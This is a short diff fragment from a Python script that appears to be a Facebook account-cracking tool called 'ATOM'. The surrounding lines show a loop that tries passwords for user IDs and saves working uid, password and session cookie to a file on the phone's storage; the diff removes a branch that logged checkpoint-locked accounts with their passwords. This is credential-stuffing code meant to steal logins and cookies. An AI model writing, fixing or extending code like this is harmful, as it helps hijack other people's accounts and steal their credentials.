@@ -1609,11 +1609,6 @@ def x(uid,pwx,tl):
                            open("/sdcard/ATOM-COOKIE-OK.txt", "a").write(f"{uid}|{pw}|{coki}\n")
                            oks.append(uid)
                            break
-            elif 'www.facebook.com' in q['error']['message']:
-                #print(f" {green}(ATOM-OK) {uid}|{pw} ")
-                open("/sdcard/ATOM-CP.txt", "a").write(f"{uid}|{pw}|\n")
-                cps.append(uid)
-                break
             else:
                 continue
         loop+=1
